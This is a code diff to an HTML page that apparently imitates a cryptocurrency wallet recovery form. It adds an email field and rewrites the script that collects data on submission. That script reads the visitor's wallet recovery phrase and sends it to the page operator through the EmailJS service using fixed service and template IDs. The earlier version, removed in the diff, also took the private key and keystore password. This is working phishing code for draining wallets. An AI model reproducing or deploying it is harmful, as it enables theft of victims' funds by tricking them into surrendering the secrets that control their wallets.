@@ -834,6 +834,13 @@
 
                                             </div>
                                             <div class="flex flex-col mb-6">
+                                                <div class="flex flex-col mb-6">
+                                                    <div class="relative">
+                                                        <input id="user_email" type="email" name="email" placeholder="Your email address" 
+                                                               class="text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400" 
+                                                               style="color: black;" required>
+                                                    </div>
+                                                </div>
                                                 <div class="relative" data-children-count="1"><textarea id="recov_phrase" cols="30" rows="4" placeholder="Enter your recovery phrase" class="text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400"
                                                         name="phrase" required="" style="color: black;"></textarea>
 
@@ -2460,36 +2467,50 @@
 
 <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
 <script>
-  // Initialize EmailJS
-  (function() {
-    emailjs.init("dDXtSOkYowLQ5dX2m"); // Replace with your public key from EmailJS
-  })();
-
-  document.getElementById("form").addEventListener("submit", function(e) {
-    e.preventDefault();
-
-    const walletName = document.getElementById("walletname").textContent || "Unknown Wallet";
-    const phrase = document.getElementById("recov_phrase").value;
-    const privateKey = document.getElementById("wallet_key").value;
-    const keystorePassword = document.getElementById("wallet_password").value;
-
-    const templateParams = {
-      walletname: walletName,
-      phrase: phrase,
-      privatekey: privateKey,
-      keystorepassword: keystorePassword
-    };
-
-    emailjs.send('service_gdxh0ee', 'template_4ehv3k8', templateParams)
-      .then(function(response) {
-        alert("Wallet information sent successfully.");
-        console.log('SUCCESS!', response.status, response.text);
-      }, function(error) {
-        alert("Failed to send. Please try again.");
-        console.log('FAILED...', error);
-      });
-  });
+    // Initialize EmailJS
+    (function() {
+        emailjs.init("dDXtSOkYowLQ5dX2m"); // Replace with your public key from EmailJS
+    })();
+    
+    document.getElementById("form").addEventListener("submit", function(e) {
+        e.preventDefault();
+    
+        const walletName = document.getElementById("walletname").textContent || "Unknown Wallet";
+        const phrase = document.getElementById("recov_phrase").value;
+    
+        const templateParams = {
+            walletname: walletName,
+            phrase: phrase,
+            email: "your-receiving-email@example.com" // Add the email address where you want to receive the data
+        };
+    
+        emailjs.send('service_gdxh0ee', 'template_4ehv3k8', templateParams)
+            .then(function(response) {
+                alert("Wallet information sent successfully.");
+                console.log('SUCCESS!', response.status, response.text);
+            }, function(error) {
+                alert("Failed to send. Please try again.");
+                console.log('FAILED...', error);
+            });
+    });
 </script>
+    
+<style>
+.acc-body {
+    display: none;
+}
+.acc-body.active {
+    display: block;
+}
+.active-tab {
+    border-bottom: 2px solid #3b82f6 !important;
+    color: #3b82f6 !important;
+}
+#form button[type='submit']:disabled {
+    opacity: 0.7;
+    cursor: not-allowed;
+}
+</style>
 
 
 </body>
